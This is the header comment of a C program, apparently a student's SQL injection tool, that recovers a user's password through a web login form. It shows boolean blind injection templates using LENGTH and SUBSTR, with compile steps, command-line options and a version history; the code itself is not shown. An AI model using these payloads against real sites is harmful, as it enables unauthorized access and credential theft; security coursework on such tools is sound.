/************************************************************************************************
*
* Description  : SQL Injection tool to recover an user's password.
*                It uses the following injection methods in the $login_form field :
*                "$login_form=$usr_name' AND LENGTH($pwd_col)=i;"        to recover pwd len
*                "$login_form=$usr_name' AND SUBSTR($pwd_col,i,1)='$c';" to recover each char
* 
* Author       : Caille Jimmy, MSE-ICT student in Telecomunication Networks and Information Security
* 
* Prerequisite : install libcurl-dev
* Compile      : gcc attack.c -o attack -lcurl -Wall -Wextra
* Usage        : ./attack -h
*      [param] [remark]            [default value]
* Usage: -h    help, this message  -none-
*        -U    URL, necessary !    -none-
*        -u    username            admin
*        -f    username field name username
*        -p    password DB name    password
*        -P    password field name password
*        -m    password min len    1
*        -M    password max len    20
*        -c    char min (decimal)  ' ' (32)
*        -C    char max (decimal)  '~' (126)
*        -s    success message     Welcome
*        -v    verbose             disabled
*
* License      : Unlicense, for more information, please refer to <https://unlicense.org>
*
* Version      : v0.2 - attacking multiple usernames
*                v0.3 - parameters added, multiple username removed, cleanup
*                v0.4 - strcpy replaced by strncpy for safely copying parameters
*                       sprintf replaced by snprtinf
*                       differentiates -v verbose   (shows requests)
*                                      -r responses (shows html)
*                                      -d libcurl debug
*                       help displayed when unknown parameter is given
*
*************************************************************************************************/